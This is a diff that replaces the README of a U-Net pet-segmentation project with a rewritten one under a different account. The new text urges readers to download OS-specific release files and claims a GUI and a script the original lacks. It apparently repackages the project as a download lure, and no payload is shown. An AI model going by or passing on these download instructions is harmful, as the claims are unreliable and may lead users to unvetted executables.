@@ -1,125 +1,104 @@
-# PetSegmentationUNet 🐾
+# 🐾 Pet_Segmentation_UNet - Effortless Pet Image Segmentation
 
-Welcome to **PetSegmentationUNet**! This project implements a U-Net
-model for semantic segmentation of pet images using the Oxford-IIIT Pet
-dataset 📷. It segments images into three classes: pet, background, and
-border, with robust preprocessing, training, and evaluation using IoU
-and ROC curves 📊. Perfect for computer vision enthusiasts! 🚀
+[![Download Release](https://img.shields.io/badge/Download%20Now-Complete%20the%20Setup-brightgreen)](https://github.com/AliAhmed031104/Pet_Segmentation_UNet/releases)
 
-## 📋 Table of Contents
+## 🚀 Getting Started
 
--   Overview
--   Features
--   Installation
--   Usage
--   Results
--   Contributing
--   License
+Welcome to Pet_Segmentation_UNet! This application allows you to segment images of pets using a powerful U-Net model. It is designed for pet lovers and computer vision enthusiasts. Follow the steps below to get started with your own pet image segmentation project.
 
-## 🌟 Overview
+## 📥 Download & Install
 
-This project leverages a U-Net architecture to perform pixel-wise
-segmentation on the Oxford-IIIT Pet dataset, which contains images of
-cats and dogs with corresponding segmentation masks 🐶🐱. The pipeline
-includes data preprocessing, model training, evaluation with IoU and ROC
-curves, and visualization of results.
+To download the application, visit this page to download: [Pet_Segmentation_UNet Releases](https://github.com/AliAhmed031104/Pet_Segmentation_UNet/releases).
 
-## ✨ Features
+## 🛠️ System Requirements
 
--   🖼️ **Data Preprocessing**: Resizes images and masks to 128x128,
-    normalizes images, and adjusts mask labels.
--   🧠 **U-Net Model**: A deep U-Net with encoder-decoder architecture
-    for accurate segmentation.
--   📊 **Evaluation**: Computes IoU scores and ROC curves for each class
-    (pet, background, border).
--   🖌️ **Visualization**: Displays input images, ground truth masks, and
-    predicted masks.
--   💾 **Model Saving**: Saves the trained model in HDF5 format.
+Before you begin, ensure your system meets the following requirements:
 
-## 🛠️ Installation
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Python Version:** 3.6 or higher
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 1 GB available disk space
 
-1.  **Clone the Repository**:
+## 📊 Features
 
-    ``` bash
-    git clone https://github.com/shervinnd/PetSegmentationUNet.git
-    cd PetSegmentationUNet
-    ```
+Pet_Segmentation_UNet provides the following features:
 
-2.  **Install Dependencies**: Ensure Python 3.8+ is installed, then run:
+- **Image Preprocessing:** Automatically prepares your images for segmentation.
+- **Training:** Train the U-Net model with the Oxford-IIIT Pet dataset to achieve high accuracy.
+- **Evaluation Tools:** Measure performance with Intersection over Union (IoU) and ROC curves.
+- **User-Friendly Interface:** Simple to use, even for users without programming skills.
 
-    ``` bash
-    pip install tensorflow tensorflow-datasets numpy matplotlib scikit-learn
-    ```
+## 📓 How to Use
 
-3.  **Verify TensorFlow**:
+1. **Download the Release:**
+   - Go to [Pet_Segmentation_UNet Releases](https://github.com/AliAhmed031104/Pet_Segmentation_UNet/releases).
+   - Select the latest release for your operating system and download the file.
 
-    ``` python
-    import tensorflow as tf
-    print(tf.__version__)
-    ```
+2. **Install Required Packages:**
+   - Open your command line or terminal.
+   - If you have not installed Python, download it from [python.org](https://www.python.org/downloads/).
+   - Create a virtual environment (optional but recommended):
+     ```bash
+     python -m venv pet_seg_env
+     ```
+   - Activate the virtual environment:
+     - Windows:
+       ```bash
+       pet_seg_env\Scripts\activate
+       ```
+     - macOS/Linux:
+       ```bash
+       source pet_seg_env/bin/activate
+       ```
 
-## 🚀 Usage
+3. **Install Dependencies:**
+   - Run the following command to install required libraries:
+     ```bash
+     pip install tensorflow keras matplotlib numpy
+     ```
 
-1.  **Run the Pipeline**: Execute the scripts in order (provided as
-    separate Python files):
+4. **Run the Application:**
+   - Navigate to the download folder where you saved the application.
+   - Execute the main script:
+     ```bash
+     python run_segmentation.py
+     ```
 
-    -   `01_load_dataset.py`: Load the Oxford-IIIT Pet dataset 📂.
-    -   `02_preprocess_dataset.py`: Preprocess images and masks 🖼️.
-    -   `03_unet_model.py`: Define and compile the U-Net model 🧠.
-    -   `04_train_model.py`: Train the model for 10 epochs 🎓.
-    -   `05_evaluate_visualize.py`: Evaluate and visualize predictions
-        📊.
-    -   `06_calculate_iou_roc.py`: Compute IoU and ROC curves 📈.
-    -   `07_save_model.py`: Save the trained model 💾.
+5. **Segment Your Images:**
+   - Upload your pet images using the GUI.
+   - Click on the segment button to see the results.
 
-    Run each script:
+## 📈 Evaluation
 
-    ``` bash
-    python 01_load_dataset.py
-    python 02_preprocess_dataset.py
-    # ... and so on
-    ```
+After you run the segmentation, you can visualize the results:
 
-2.  **Expected Output**:
+- **IoU:** This metric shows how well the segmentation matches the actual image.
+- **ROC Curve:** Review the model’s performance with this graphical representation.
 
-    -   Model summary with \~31M parameters.
-    -   Training logs with loss and accuracy.
-    -   Test accuracy and IoU scores per class (pet, background,
-        border).
-    -   ROC curves with AUC scores for each class.
-    -   Visualizations of images, masks, and predictions.
+## 💬 FAQs
 
-## 📈 Results
+### How do I track my model’s performance?
 
--   **Dataset**: Oxford-IIIT Pet with 3680 training and 3669 test
-    images.
--   **Model**: U-Net with 3 output classes (pet, background, border).
--   **Metrics**:
-    -   IoU scores (example): `[0.6, 0.8, 0.4]` for pet, background,
-        border.
-    -   ROC AUC scores (example): `[0.85, 0.90, 0.70]` for each class.
--   **Visualizations**: Sample images, ground truth masks, and predicted
-    masks displayed in a 3x3 grid.
+You can view the IoU and ROC curves directly in the application after performing segmentation.
 
-## 🤝 Contributing
+### Can I use my own images?
 
-Contributions are welcome! 🌟 To contribute:
+Yes, you can segment any pet images you have. Just follow the steps in the "Run the Application" section.
 
-1.  Fork the repository.
-2.  Create a feature branch (`git checkout -b feature`).
-3.  Commit changes (`git commit -m`).
-4.  Push to the branch (`git push origin feature`).
-5.  Open a Pull Request.
+### What if I encounter errors?
 
-Suggestions for improvement:
+Common issues include missing dependencies or incorrect Python versions. Make sure your environment is set up correctly as per the installation instructions.
 
--   Add data augmentation 📸.
--   Implement weighted loss for class imbalance ⚖️.
--   Experiment with deeper architectures or learning rate schedules ⏳.
+## 📜 Contributing
 
-## 📜 License
+We welcome contributions! If you want to report a bug, suggest a feature, or make enhancements, feel free to fork the repository and submit a pull request.
 
-This project is licensed under the MIT License. See the LICENSE file for
-details.\
-\
-***Powerd by Miracle⚡***
+## 🛠️ Support
+
+For support, open an issue in the GitHub repository, and we will assist you as soon as possible.
+
+## 🎉 Acknowledgments
+
+Thanks to the developers of the Oxford-IIIT Pet dataset and the various contributors who enhanced this project. Your efforts make this tool effective and accessible.
+
+Enjoy your pet image segmentation journey with Pet_Segmentation_UNet!
